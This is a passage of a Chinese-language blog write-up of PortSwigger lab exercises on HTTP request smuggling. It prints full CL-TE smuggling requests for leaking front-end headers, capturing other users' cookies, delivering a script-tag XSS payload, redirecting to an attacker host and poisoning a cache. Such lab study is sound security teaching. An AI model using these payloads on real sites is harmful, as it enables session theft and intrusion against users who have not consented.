x80FD;&#x591F;&#x5C06;&#x8BF7;&#x6C42;&#x53C2;&#x6570;&#x7684;&#x503C;&#x8F93;&#x51FA;&#x5230;&#x54CD;&#x5E94;&#x4E2D;&#x7684;POST&#x8BF7;&#x6C42;</li><li>&#x628A;&#x8BE5;POST&#x8BF7;&#x6C42;&#x4E2D;&#xFF0C;&#x627E;&#x5230;&#x7684;&#x8FD9;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x53C2;&#x6570;&#x653E;&#x5728;&#x6D88;&#x606F;&#x7684;&#x6700;&#x540E;&#x9762;</li><li>&#x7136;&#x540E;&#x8D70;&#x79C1;&#x8FD9;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#xFF0C;&#x7136;&#x540E;&#x76F4;&#x63A5;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x8FD9;&#x4E2A;&#x8BF7;&#x6C42;&#x91CD;&#x5199;&#x7684;&#x4E00;&#x4E9B;&#x5B57;&#x6BB5;&#x5C31;&#x4F1A;&#x663E;&#x793A;&#x51FA;&#x6765;&#x3002;</li></ul></blockquote><p>&#x6709;&#x65F6;&#x5019; Front &#x670D;&#x52A1;&#x5668;&#x4F1A;&#x7ED9;&#x8F6C;&#x53D1;&#x7684;&#x8BF7;&#x6C42;&#x6DFB;&#x52A0;&#x4E00;&#x4E9B;&#x8BF7;&#x6C42;&#x5934;&#x518D;&#x8F6C;&#x53D1;&#x7ED9; Backend &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528; HTTP Smuggling &#x7684;&#x65B9;&#x5F0F;&#x6765;&#x6CC4;&#x9732;&#x8FD9;&#x4E9B;&#x8BF7;&#x6C42;&#x5934;&#x3002;&#x540C;&#x6837;&#x6211;&#x4EEC;&#x501F;&#x52A9; LAB &#x6765;&#x5B9E;&#x8DF5;&#x7406;&#x89E3;&#xFF1A;<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&#x2019;t support chunked encoding.</p><p>There&#x2019;s an admin panel at /admin, but it&#x2019;s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It&#x2019;s similar to the X-Forwarded-For header but has a different name.</p><p>To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.</p></blockquote><p>&#x8FD9;&#x91CC;&#x6839;&#x636E;&#x9898;&#x76EE;&#x63D0;&#x793A;&#xFF0C;&#x573A;&#x666F;&#x662F;&#x4E00;&#x4E2A; CL-TE &#x7684;&#x573A;&#x666F;&#xFF0C;&#x5E76;&#x4E14;&#x7ED9;&#x51FA;&#x4E00;&#x4E2A;&#x641C;&#x7D22;&#x6846;&#xFF0C;&#x6211;&#x4EEC;&#x5C1D;&#x8BD5;&#x968F;&#x4FBF;&#x641C;&#x7D22;&#x4E00;&#x4E2A; 123 &#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x641C;&#x7D22;&#x7ED3;&#x679C;&#x201C;123&#x201D;&#x76F4;&#x63A5;&#x56DE;&#x663E;&#x5230;&#x4E86;&#x76F8;&#x5E94;&#x5F53;&#x4E2D;&#x3002;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124191719.png" alt></p><p>&#x5C1D;&#x8BD5;&#x4F7F;&#x7528; HTTP Smuggling &#x65B9;&#x5F0F;&#x8BBF;&#x95EE;&#xFF0C;&#x4F46;&#x662F;&#x88AB; blocked &#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124203138.png" alt></p><p>&#x7136;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x5229;&#x7528;&#x641C;&#x7D22;&#x56DE;&#x663E;&#x628A; Front &#x670D;&#x52A1;&#x5668;&#x8F6C;&#x53D1;&#x7684;&#x8BF7;&#x6C42;&#x5934;&#x7ED9;&#x6CC4;&#x9732;&#x51FA;&#x6765;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124202357.png" alt></p><p>&#x5982;&#x679C;&#x540E;&#x9762;&#x53EA;&#x662F;&#x6DFB;&#x52A0;&#x90A3;&#x4E2A; X-*-Ip &#x7684;&#x8BF7;&#x6C42;&#x5934;&#x662F;&#x8BBF;&#x95EE;&#x4E0D;&#x4E86; admin &#x9762;&#x677F;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x6837;&#x4F1A;&#x8BA9; Backend &#x6536;&#x5230;&#x4E24;&#x4E2A;&#x91CD;&#x590D;&#x7684;&#x8BF7;&#x6C42;&#x5934;&#xFF0C;&#x5728;&#x8FD9;&#x4E2A;&#x573A;&#x666F;&#x5F53;&#x4E2D;&#xFF0C;Backend &#x670D;&#x52A1;&#x5668;&#x5BF9;&#x91CD;&#x590D;&#x7684;&#x8BF7;&#x6C42;&#x5934;&#x505A;&#x51FA;&#x4E86;&#x5224;&#x65AD;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124204018.png" alt></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x628A; Front &#x670D;&#x52A1;&#x5668;&#x6DFB;&#x52A0;&#x7684;&#x8BF7;&#x6C42;&#x5934;&#x7ED9;&#x201C;&#x9690;&#x85CF;&#x201D;&#x6389;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528; Smuggling &#x901A;&#x8FC7; body &#x7684;&#x65B9;&#x5F0F;&#x628A;&#x5176;&#x4ED6; Front &#x670D;&#x52A1;&#x5668;&#x6DFB;&#x52A0;&#x7684;&#x8BF7;&#x6C42;&#x5934;&#x201C;&#x9690;&#x85CF;&#x201D;&#x6389;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230; admin &#x9762;&#x677F;&#x56DE;&#x663E;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124203108.png" alt></p><p>&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x770B;&#x8D77;&#x6765;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x4F46;&#x662F;&#x4ED4;&#x7EC6;&#x505A;&#x7684;&#x8BDD;&#xFF0C;&#x5176;&#x5B9E; CL &#x7684;&#x503C;&#x6BD4;&#x8F83;&#x5173;&#x952E;&#xFF0C;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x6CC4;&#x9732; Front &#x8BF7;&#x6C42;&#x7684;&#x90A3;&#x4E2A;&#x6570;&#x636E;&#x5305;&#x7684; CL &#x503C;&#x600E;&#x4E48;&#x7B97;&#x7684;&#xFF1A;</p><figure class="highlight xl hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>\<span class="hljs-function"><span class="hljs-title">r</span>\n--&gt;</span><span class="hljs-number">3</span>&#x4E2A;&#x5B57;&#x8282;</span><br><span class="line">\<span class="hljs-function"><span class="hljs-title">r</span>\n--&gt;</span> <span class="hljs-number">2</span>&#x4E2A;&#x5B57;&#x8282;</span><br><span class="line">POST / HTTP/<span class="hljs-number">1.1</span>\<span class="hljs-function"><span class="hljs-title">r</span>\n--&gt;</span><span class="hljs-number">17</span>&#x4E2A;&#x5B57;&#x8282;</span><br><span class="line">C<span class="hljs-function"><span class="hljs-title">ontent</span>-Length: 70\r\n--&gt;</span><span class="hljs-number">20</span>&#x4E2A;&#x5B57;&#x8282;</span><br><span class="line">C<span class="hljs-function"><span class="hljs-title">ontent</span>-Type: application/x-www-form-urlencoded\r\n--&gt;</span><span class="hljs-number">49</span>&#x4E2A;&#x5B57;&#x8282;</span><br><span class="line">\<span class="hljs-function"><span class="hljs-title">r</span>\n--&gt;</span> <span class="hljs-number">2</span>&#x4E2A;&#x5B57;&#x8282;</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">search</span>=123--&gt;</span> <span class="hljs-number">10</span>&#x4E2A;&#x5B57;&#x8282;</span><br></pre></td></tr></table></figure><p>&#x603B;&#x5171;&#x662F; 103 &#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x8FD9;&#x91CC;&#x7684; CL &#x4E5F;&#x53EF;&#x4EE5;&#x4E0D;&#x662F; 70 &#xFF0C;&#x8FD9;&#x91CC;&#x53EA;&#x662F;&#x63A7;&#x5236;&#x6CC4;&#x9732;&#x591A;&#x5C11;&#x5B57;&#x8282;&#x7684;&#x5185;&#x5BB9;&#x3002;</p><p>&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x5C31;&#x662F;&#x5982;&#x679C;&#x4F60;&#x4E0D;&#x6DFB;&#x52A0; Content-Type &#x5B57;&#x6BB5;&#x7684;&#x8BDD;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x6700;&#x540E;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;<code>\r\n</code>&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x8FD4;&#x56DE; 400 &#x3002;</p><h3 id="Capturing-other-users&#x2019;-requests"><a href="#Capturing-other-users&#x2019;-requests" class="headerlink" title="Capturing other users&#x2019; requests"></a>Capturing other users&#x2019; requests</h3><p>&#x65E2;&#x7136;&#x80FD;&#x62FF;&#x5230;&#x4E2D;&#x95F4;&#x4EF6;&#x8BF7;&#x6C42;&#xFF0C;&#x5F53;&#x7136;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x53BB;&#x62FF;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x4E5F;&#x80FD;&#x62FF;&#x5230; Cookie &#x7B49;&#xFF0C;LAB &#x5730;&#x5740;&#xFF1A;<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to capture other users&#x2019; requests</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&#x2019;t support chunked encoding.</p><p>To solve the lab, smuggle a request to the back-end server that causes the next user&#x2019;s request to be stored in the application. Then retrieve the next user&#x2019;s request and use the victim user&#x2019;s cookies to access their account.</p></blockquote><p>&#x539F;&#x7406;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x53D1;&#x8BC4;&#x8BBA;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x7136;&#x540E;&#x5229;&#x7528;&#x8BC4;&#x8BBA;&#x5904;&#x8FDB;&#x884C; HTTP Smuggling&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4EE5;&#x4E0B;&#x8BF7;&#x6C42;&#x5305;&#xFF1A;</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac951f7d1e9ea625803c617f003f005c.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 271</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 600</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At</span><br><span class="line"></span><br><span class="line">csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN&amp;postId=5&amp;name=1&amp;email=1%40qq.com&amp;website=http%3A%2F%2Fwww.baidu.com&amp;comment=1</span><br></pre></td></tr></table></figure><p>&#x53EA;&#x8981;&#x4E0B;&#x9762;&#x8FD9;&#x4E2A; CL &#x8DB3;&#x591F;&#x5927;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x7528; HTTP Smuggling &#x628A;&#x4E0B;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x7684;&#x8BF7;&#x6C42;&#x62FC;&#x63A5;&#x5230;&#x6211;&#x4EEC;&#x6700;&#x540E;&#x4E00;&#x4E2A; comment &#x53C2;&#x6570;&#x91CC;&#x9762;&#x4E86;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x5728;&#x770B;&#x8BC4;&#x8BBA;&#x5904;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x522B;&#x4EBA;&#x7684;&#x8BF7;&#x6C42;&#x5934;&#x4E86;&#x3002;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124213544.png" alt></p><h3 id="Exploit-Reflected-XSS"><a href="#Exploit-Reflected-XSS" class="headerlink" title="Exploit Reflected XSS"></a>Exploit Reflected XSS</h3><p>&#x8FD9;&#x4E2A;&#x5229;&#x7528;&#x573A;&#x666F;&#x53EF;&#x80FD;&#x6BD4;&#x8F83;&#x53D7;&#x9650;&#xFF0C;&#x4E5F;&#x6BD4;&#x8F83;&#x5C11;&#x89C1;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x5B58;&#x5728; HTTP Smuggling &amp; reflected XSS &#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x7EC4;&#x5408;&#x62F3; X &#x5230;&#x522B;&#x4EBA;&#x7684; cookie</p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&#x2019;t support chunked encoding.</p><p>The application is also vulnerable to <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" rel="noopener">reflected XSS</a> via the User-Agent header.</p><p>To solve the lab, smuggle a request to the back-end server that causes the next user&#x2019;s request to receive a response containing an XSS exploit that executes alert(1).</p></blockquote><p>&#x8FD8;&#x662F;&#x4F9D;&#x65E7;&#x7684; CL-TE &#x573A;&#x666F;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728; UA &#x5904;&#x53D1;&#x73B0;&#x6709;&#x4E00;&#x4E2A;&#x53CD;&#x5C04; XSS&#xFF0C;but &#x5355;&#x662F;&#x8FD9;&#x6837;&#x6CA1;&#x4EC0;&#x4E48;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5F97;&#x60F3;&#x70B9;&#x529E;&#x6CD5;&#x5347;&#x7EA7;&#x5371;&#x5BB3;&#x3002;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124235543.png" alt></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4EE5;&#x4E0B;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x53EA;&#x8981;&#x53D1;&#x9001;&#x4E00;&#x6B21;</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac811f011e27d43b80301693005a0007.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 150</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /post?postId=5 HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 5</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure><p>&#x7136;&#x540E;&#x6211;&#x4EEC;&#x968F;&#x4FBF;&#x8BBF;&#x95EE;&#x8BE5;&#x7AD9;&#x4EFB;&#x4F55;&#x9875;&#x9762;&#x90FD;&#x4F1A;&#x88AB;&#x5F39;&#x7A97;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x7684;&#x8BF7;&#x6C42;&#x88AB;&#x5D4C;&#x5165;&#x5230;&#x4E86;&#x4E0A;&#x9762;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x8BF7;&#x6C42;&#x5F53;&#x4E2D;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191125000410.png" alt></p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191125001149.png" alt></p><h3 id="Turn-An-On-Site-Redirect-Into-An-Open-Redirect"><a href="#Turn-An-On-Site-Redirect-Into-An-Open-Redirect" class="headerlink" title="Turn An On-Site Redirect Into An Open Redirect"></a>Turn An On-Site Redirect Into An Open Redirect</h3><p>&#x8FD9;&#x79CD;&#x653B;&#x51FB;&#x573A;&#x666F;&#x662F;&#x5728;&#x76EE;&#x6807;&#x5728;&#x4F7F;&#x7528; 30x &#x8DF3;&#x8F6C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F7F;&#x7528;&#x4E86; Host &#x5934;&#x8FDB;&#x884C;&#x8DF3;&#x8F6C;&#xFF0C;&#x4F8B;&#x5982;&#x5728; Apache &amp; IIS &#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x4E00;&#x4E2A;uri &#x6700;&#x540E;&#x4E0D;&#x5E26; / &#x7684;&#x8BF7;&#x6C42;&#x4F1A;&#x88AB; 30x &#x5BFC;&#x5411;&#x5E26; / &#x7684;&#x5730;&#x5740;&#xFF0C;&#x4F8B;&#x5982;&#x53D1;&#x9001;&#x4EE5;&#x4E0B;&#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/home</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: normal-website.com</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x4F1A;&#x5F97;&#x5230; Response :</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">301</span> Moved Permanently</span><br><span class="line"><span class="hljs-attribute">Location</span>: https://normal-website.com/home/</span><br></pre></td></tr></table></figure><p>&#x770B;&#x8D77;&#x6765;&#x6CA1;&#x4EC0;&#x4E48;&#x5371;&#x5BB3;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x914D;&#x5408; HTTP Smuggling &#x5C31;&#x4F1A;&#x6709;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 54</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /home HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: attacker-website.com</span><br><span class="line"><span class="hljs-attribute">Foo</span>: X</span><br></pre></td></tr></table></figure><p>Smugle &#x4E4B;&#x540E;&#x7684;&#x8BF7;&#x6C42;&#x4F1A;&#x50CF;&#x4EE5;&#x4E0B;&#x8FD9;&#x6837;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/home</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: attacker-website.com</span><br><span class="line"><span class="hljs-attribute">Foo</span>: XGET /scripts/include.js HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br></pre></td></tr></table></figure><p>&#x7136;&#x540E;&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x6839;&#x636E; Host &#x8FDB;&#x884C;&#x8DF3;&#x8F6C;&#x7684;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x5F97;&#x5230;&#x4EE5;&#x4E0B;&#x7684; Response:</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">301</span> Moved Permanently</span><br><span class="line"><span class="hljs-attribute">Location</span>: https://attacker-website.com/home/</span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x6837;&#xFF0C;&#x53D7;&#x5BB3;&#x8005;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BBF;&#x95EE;<code>/scripts/include.js</code>&#x8FD9;&#x4E2A;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x4F1A;&#x88AB;&#x8DF3;&#x8F6C;&#x5230;&#x6211;&#x4EEC;&#x63A7;&#x5236;&#x7684; url &#x4E86;&#x3002;</p><h3 id="Perform-Web-Cache-Poisoning"><a href="#Perform-Web-Cache-Poisoning" class="headerlink" title="Perform Web Cache Poisoning"></a>Perform Web Cache Poisoning</h3><p>&#x8FD9;&#x4E2A;&#x573A;&#x666F;&#x4E5F;&#x662F;&#x57FA;&#x4E8E;&#x4E0A;&#x9762;&#x7684; Host &#x8DF3;&#x8F6C;&#x7684;&#x653B;&#x51FB;&#x573A;&#x666F;&#xFF0C;&#x5982;&#x679C; Front &#x670D;&#x52A1;&#x5668;&#x8FD8;&#x5B58;&#x5728;&#x7F13;&#x5B58;&#x9759;&#x6001;&#x8D44;&#x6E90;&#x7684;&#x8BDD;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x914D;&#x5408; HTTP Smuggling &#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x6295;&#x6BD2;&#xFF0C;<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to perform web cache poisoning</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn&#x2019;t support chunked encoding. The front-end server is configured to cache certain responses.</p><p>To solve the lab, perform a <a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">request smuggling</a> attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server.</p></blockquote><p>&#x8FD9;&#x4E2A;&#x73AF;&#x5883;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x53EF;&#x4EE5;&#x4FEE;&#x6539; Host &#x8FDB;&#x884C;&#x8DF3;&#x8F6C;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x800C;&#x5728;<code>/post/next?postId=2</code>&#x8DEF;&#x7531;&#x6B63;&#x597D;&#x6709;&#x4E00;&#x4E2A;&#x8DF3;&#x8F6C;&#x7684; api &#x4F9B;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#xFF0C;&#x8FD9;&#x4E2A;&#x8DEF;&#x7531;&#x8DF3;&#x8F6C;&#x5230;&#x7684;&#x662F;<code>/post?postId=4</code>&#x3002;</p><p>&#x6839;&#x636E;&#x9898;&#x76EE;&#x63CF;&#x8FF0;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5B9E;&#x73B0;&#x7F13;&#x5B58;&#x6295;&#x6BD2;&#xFF0C; &#x4F8B;&#x5982;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x5C31;&#x9009;&#x62E9;<code>/resources/js/tracking.js</code>&#x8FDB;&#x884C;&#x6295;&#x6BD2;&#xFF0C;LAB &#x8FD8;&#x7ED9;&#x4E86;&#x6211;&#x4EEC;&#x5236;&#x9020;&#x6295;&#x6BD2;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x4EE5;&#x4E0B;&#x8BBE;&#x7F6E;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129014911.png" alt></p><p>&#x53D1;&#x9001;&#x4EE5;&#x4E0B;&#x6570;&#x636E;&#x5305;&#x4E00;&#x6B21;&#xFF1A;</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac7a1f141fadd93d801c469f005500bf.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; 